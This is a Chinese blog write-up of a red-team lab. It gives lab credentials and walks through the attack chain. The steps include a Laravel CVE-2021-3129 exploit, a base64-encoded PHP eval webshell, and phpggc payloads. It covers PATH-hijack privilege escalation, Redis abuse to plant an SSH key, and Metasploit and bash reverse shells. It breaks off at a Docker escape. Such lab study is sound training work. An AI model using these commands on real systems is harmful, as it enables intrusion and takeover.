@@ -1,0 +1,658 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>ATT&amp;CK(七) | wanan</title><meta name="keywords" content="靶场,ATT&amp;CK"><meta name="author" content="wanan"><meta name="copyright" content="wanan"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="ATT&amp;CK(七)      Administrator：Whoami2021whoami：Whoami2021bunny：Bunny2021moretz：Moretz2021Ubuntu 1： web：web2021Ubuntu 2： ubuntu：ubuntu通达OA账户： admin：admin657260  web1 使用 web：web2021 登录 sudo redis-ser">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ATT&amp;CK(七)">
+<meta property="og:url" content="https://www.wanan.red/fd98f1f7.html">
+<meta property="og:site_name" content="wanan">
+<meta property="og:description" content="ATT&amp;CK(七)      Administrator：Whoami2021whoami：Whoami2021bunny：Bunny2021moretz：Moretz2021Ubuntu 1： web：web2021Ubuntu 2： ubuntu：ubuntu通达OA账户： admin：admin657260  web1 使用 web：web2021 登录 sudo redis-ser">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.pixabay.com/photo/2016/10/18/21/28/seljalandsfoss-1751463_1280.jpg">
+<meta property="article:published_time" content="2023-01-22T13:10:22.554Z">
+<meta property="article:modified_time" content="2023-01-22T13:12:51.954Z">
+<meta property="article:author" content="wanan">
+<meta property="article:tag" content="靶场">
+<meta property="article:tag" content="ATT&amp;CK">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.pixabay.com/photo/2016/10/18/21/28/seljalandsfoss-1751463_1280.jpg"><link rel="shortcut icon" href="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203092159138.jpeg"><link rel="canonical" href="https://www.wanan.red/fd98f1f7"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="Lkrie_55AalLqll4AtBs-NEomlv8QQYHGMx1V0cbq88"/><meta name="baidu-site-verification" content="code-h7qMMwh8fd"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?0a85e115f35e16b8da9503b0d77633ca";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-FYB0HL88QE"></script><script>window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('config', 'G-FYB0HL88QE');
+</script><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'ATT&CK(七)',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-01-22 21:12:51'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.0.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203092159138.jpeg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">120</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">91</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">107</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.pixabay.com/photo/2016/10/18/21/28/seljalandsfoss-1751463_1280.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">wanan</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">ATT&amp;CK(七)</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-01-22T13:10:22.554Z" title="发表于 2023-01-22 21:10:22">2023-01-22</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-22T13:12:51.954Z" title="更新于 2023-01-22 21:12:51">2023-01-22</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%86%85%E7%BD%91/">内网</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%86%85%E7%BD%91/ATT-CK-%E4%B8%83/">ATT&amp;CK(七)</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>13分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="ATT&amp;CK(七)"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="ATT-amp-CK-七"><a href="#ATT-amp-CK-七" class="headerlink" title="ATT&amp;CK(七)"></a>ATT&amp;CK(七)</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221005165557029.png" alt="image-20221005165557029"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221005182313530.png" alt="image-20221005182313530"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221005182414128.png" alt="image-20221005182414128"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221005182532349.png" alt="image-20221005182532349"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221005182537632.png" alt="image-20221005182537632"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221005182542793.png" alt="image-20221005182542793"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Administrator：Whoami2021</span><br><span class="line">whoami：Whoami2021</span><br><span class="line">bunny：Bunny2021</span><br><span class="line">moretz：Moretz2021</span><br><span class="line">Ubuntu 1： web：web2021</span><br><span class="line">Ubuntu 2： ubuntu：ubuntu</span><br><span class="line">通达OA账户： admin：admin657260</span><br></pre></td></tr></table></figure>
+
+<p>web1 使用 web：web2021 登录</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo redis-server /etc/redis.conf</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221005183500185.png" alt="image-20221005183500185"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /usr/sbin/nginx -c /etc/nginx/nginx.conf</span><br><span class="line">sudo iptables -F</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221005185444586.png" alt="image-20221005185444586"></p>
+<p>web2</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo service docker start</span><br><span class="line">sudo docker start 8e172820ac78</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221005185900470.png" alt="image-20221005185900470"></p>
+<p>win7 Administrator：Whoami2021 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\MYOA\bin\AutoConfig.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221005192703892.png" alt="image-20221005192703892"></p>
+<h2 id="laravel"><a href="#laravel" class="headerlink" title="laravel"></a>laravel</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap 192.168.1.0/24</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221005193233623.png" alt="image-20221005193233623"></p>
+<p>81端口开放了laravel服务 这里也存在版本</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221005212320173.png" alt="image-20221005212320173"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit laravel</span><br><span class="line">searchsploit php/webapps/49424.py -m</span><br><span class="line">cat /root/49424.py</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221005212549355.png" alt="image-20221005212549355"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/zhzyker/CVE-2021-3129.git</span><br><span class="line">cd CVE-2021-3129</span><br><span class="line">python3 exp.py http://192.168.1.128:81/ </span><br></pre></td></tr></table></figure>
+
+<p>这里可以看到有的脚本是没有执行成功的</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221006140459096.png" alt="image-20221006140459096"></p>
+<p>这里看到rce5是执行成功的 因此我们修改命令写入马 这里我选择分两次写入 一次性写入会导致字符损失 猜测是由于 $_POST作为了linux中的一个变量</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221006180203787.png" alt="image-20221006180203787"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221006180330870.png" alt="image-20221006180330870"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221006180346571.png" alt="image-20221006180346571"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221006180403266.png" alt="image-20221006180403266"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221006180439427.png" alt="image-20221006180439427"></p>
+<p>或者 base64编码一下</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221006180845055.png" alt="image-20221006180845055"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo PD9waHAgQGV2YWwoJF9QT1NUWyd6ZiddKTs/Pg==|base64 -d &gt; zf.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221006180954349.png" alt="image-20221006180954349"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221006181014043.png" alt="image-20221006181014043"></p>
+<h2 id="phpggc使用"><a href="#phpggc使用" class="headerlink" title="phpggc使用"></a>phpggc使用</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/ambionics/phpggc.git</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./phpggc -l</span><br></pre></td></tr></table></figure>
+
+<p>列出所有的链</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221006182331745.png" alt="image-20221006182331745"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./phpggc  Laravel/RCE2 -i</span><br></pre></td></tr></table></figure>
+
+<p>其中包含了生成攻击payload 所需要的参数</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221006182526120.png" alt="image-20221006182526120"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./phpggc  Laravel/RCE2 system id</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221006182614585.png" alt="image-20221006182614585"></p>
+<p>对于只能满足写文件需求的组件 需要知道文件的绝对路径,例如目标网站的绝对路径为 &#x2F;var&#x2F;www&#x2F;html 需要写入shell.php </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./phpggc Doctrine/FW1 -i </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221006183815606.png" alt="image-20221006183815606"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./phpggc /var/www/html/shell.php eval.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221006183912677.png" alt="image-20221006183912677"></p>
+<p>phpggc中的 -w参数还可以对序列化数据进行一个再次包装</p>
+<p>在形成序列化数据之前调用其来更改序列化的对象,若存在以下漏洞点,接受参数为一个二维数组,那么我们需要对其中的message键对应的值进行反序列化</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line"><span class="keyword">print</span> <span class="variable">$data</span>[<span class="string">&#x27;message&#x27;</span>];</span><br></pre></td></tr></table></figure>
+
+<p>此时可以自己利用phpgcc 提供的 process_object($object),即data对应的值不是一个序列化的字符串,而data[‘message’]的值才应该是一个序列化后的字符串,这里只需要将要序列化的对象的值赋值给message,即可只用</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">process_object</span>(<span class="params"><span class="variable">$object</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;message&#x27;</span>=&gt;<span class="variable">$object</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里将序列化的对象的值赋值给了message ,并返回为一个数组,然后在对数组进行serialize()函数处理,形成序列化后的数据</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./phpggc -w array.php slim/rce1 system id</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221006185604591.png" alt="image-20221006185604591"></p>
+<h2 id="尝试提权"><a href="#尝试提权" class="headerlink" title="尝试提权"></a>尝试提权</h2><p>尝试反弹shell但没有成功</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210091703763.png" alt="image-20221009170350712"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210091719575.png" alt="image-20221009171929541"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210091723236.png" alt="image-20221009172346200"></p>
+<p>这里的demo.c应该是shell的源码</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210091725745.png" alt="image-20221009172534710"></p>
+<p>这里的脚本执行了ps命令并且未使用绝对路径</p>
+<p>那么尝试更改$PATH来执行恶意程序,从而获得目标主机的root权限shell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">echo &quot;/bin/bash&quot; &gt; ps</span><br><span class="line">chmod 777 ps</span><br><span class="line">echo $PATH</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">#将/tmp添加到环境变量中,并且先加载执行 /tmp里的程序</span><br><span class="line">cd /home/jobs</span><br><span class="line">./shell</span><br></pre></td></tr></table></figure>
+
+<p>不过这里在写 环境变量的时候出现了问题 至于这里的问题呢 我们可以在后面发现其实是 nginx 的反向代理 这里我们就先去看 redis </p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210092240484.png" alt="image-20221009224010402"></p>
+<h2 id="redis-未授权"><a href="#redis-未授权" class="headerlink" title="redis 未授权"></a>redis 未授权</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap 192.168.1.128  --top-ports 5000</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210091545168.png" alt="image-20221009154528981"></p>
+<p>这里可以看到开放了 redis 服务</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget https://download.redis.io/redis-stable.tar.gz</span><br><span class="line">tar -zxvf redis-stable.tar.gz </span><br><span class="line">cd redis-stable</span><br><span class="line">make</span><br><span class="line">cd src/</span><br><span class="line">ll</span><br></pre></td></tr></table></figure>
+
+<p>下载redis 服务并编译</p>
+<p>如果make出错 请更新 gcc版本</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum -y install centos-release-scl</span><br><span class="line">yum -y install devtoolset-8-gcc devtoolset-8-gdb devtoolset-8-gcc-c++ devtoolset-8-binutils</span><br><span class="line">scl enable devtoolset-8 bash</span><br><span class="line">echo “source /opt/rh/devtoolset-8/enable” &gt;&gt;/etc/profile</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./redis-cli -h 192.168.1.128 -p 6379 </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210091549626.png" alt="image-20221009154936579"></p>
+<p>可以看到存在未授权访问</p>
+<h3 id="公钥登录"><a href="#公钥登录" class="headerlink" title="公钥登录"></a>公钥登录</h3><p>我们写公钥登录试试</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210091553842.png" alt="image-20221009155314776"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">config get dir</span><br><span class="line">#检查当前保存路径</span><br><span class="line">config get dbfilename</span><br><span class="line">#检查保存文件名</span><br><span class="line">config set dir /root/.ssh/</span><br><span class="line">#设置保存路径</span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line">#设置数据库文件名</span><br><span class="line">set wanan  &quot;\n\n\n ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCYLjlY2PVJ+OggsLfO4+kYbxJyj7zERoeTxoyLes/y0IXffteXEWKzfViHu+NhVhjULA5ttj0vDujnO3Nn/A0DzLY/m8uqZYhokVwQl3wpijOhkCvDNZZ5euuCSbrWLk/72pGvEJmS6y0kWR/l7JXQUAbdGfFXXV0smiGZfNM6ksJzvekUwHNuEHXK3uzlPKrcfNpGB6pg9c6m3z0mEKFPmXy9MHroxj9ivyQQfgG/tAuZjnXscVum0qgz4o+q5k7x4jgMK7jx7yQpEZES80rwL/Oi8r7iyiC5yjWh2ufeuosyCp7ybboDtVoMhsbS+h0gZNO3JI7BUEtwX/bvaLZ09RSPYwEsFMtW7IGdjos+WyohvhnAb5Q4xnSO3juNuqnbvnXSiEOYdjFX9b0iFqZ/tePSbvwDIhLDDOVkgKCyTAn5jmffc4aV2uCrzptsQmEHketc+xI2jGJYYvLG4JDfvqp10VS72dX1jcTVHhKapIZekn5xjPGspAFb90BRS7s= root@kali \n\n\n&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210091555471.png" alt="image-20221009155526425"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -i /root/.ssh/id_rsa root@192.168.1.128</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210091558175.png" alt="image-20221009155811108"></p>
+<p>这里可以看到存在两张网卡 一张是 1.128 一张是 52.10 </p>
+<p>这里发现nginx服务</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210102106436.png" alt="image-20221010210653377"></p>
+<p>这里找到nginx的配置文件发现没有有用的</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210102106533.png" alt="image-20221010210622432"></p>
+<p>不过这里还包含了一个</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210102107796.png" alt="image-20221010210726737"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210102108370.png" alt="image-20221010210808310"></p>
+<p>这里可以发现是代理的 其中80端口代理的是 <a target="_blank" rel="noopener" href="https://whoamianony.top/">https://whoamianony.top/</a> 但是这里刚开始的时候访问80是不通的 </p>
+<p>这里改成我的博客试试</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210102120203.png" alt="image-20221010212051145"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210102119030.png" alt="image-20221010211920976"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210102121032.png" alt="image-20221010212114827"></p>
+<p>这里也可以看到81端口代理的是 52.20 的 8000服务 也就是说这里我们之前反弹shell出现的问题其实是由于52.20 不出网</p>
+<h2 id="上线web1-52-10"><a href="#上线web1-52-10" class="headerlink" title="上线web1(52.10)"></a>上线web1(52.10)</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/multi/script/web_delivery</span><br><span class="line">set target 7</span><br><span class="line">set payload linux/x64/meterpreter/reverse_tcp </span><br><span class="line">set lhost 192.168.1.129</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210092248702.png" alt="image-20221009224848641"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210092248148.png" alt="image-20221009224856104"></p>
+<p>我们这里反弹shell 给web1</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210100828149.png" alt="image-20221010082808007"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.52.10/5555 0&gt;&amp;1&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210092256595.png" alt="image-20221009225326171"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210092253568.png" alt="image-20221009225350525"></p>
+<p>这里的话反弹shell就没有问题了 推测可能是蚁剑的交互式shell的原因无法执行写入 环境变量</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210092256780.png" alt="image-20221009225644718"></p>
+<h2 id="提权web2-52-20"><a href="#提权web2-52-20" class="headerlink" title="提权web2(52.20)"></a>提权web2(52.20)</h2><h3 id="环境变量提权"><a href="#环境变量提权" class="headerlink" title="环境变量提权"></a>环境变量提权</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">echo &quot;/bin/bash&quot; &gt; ps</span><br><span class="line">chmod 777 ps</span><br><span class="line">echo $PATH</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">echo $PATH</span><br><span class="line">cd /home/jobs</span><br><span class="line">./shell</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202210100833381.png" alt="image-20221010083337272"></p>
+<h2 id="docker-特权模式逃逸"><a href="#docker-特权模式逃逸" class="headerlink" title="docker 特权模式逃逸"></a>docker 特权模式逃逸</h2><p>特权模式在 0.6被引入docker ,允许容器内的root拥有外部物理机的root权限,而此前容器内的root用户仅拥有外部物理机的普通用户权限</p>
+<p>使用特权模式启动容器,可以获取大量的设备文件访问权限,因为当管理员执行 docekr run –privileged 时,docekr 容器将被允许访问主机上的所有设备,并可执行mount命令进行挂载</p>
+<p>当控制使用特权模式启动容器时,docker管理员可以通过mount命令将外部宿主机磁盘设备挂载进容器的内部,获取对整个宿主机的文件读写权限,此外还可以通过写入计划任务等方式在宿主机上执行命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hostname</span><br><span class="line">cat /proc/self/cgroup </span><br></pre></td></tr></table></figure>
+
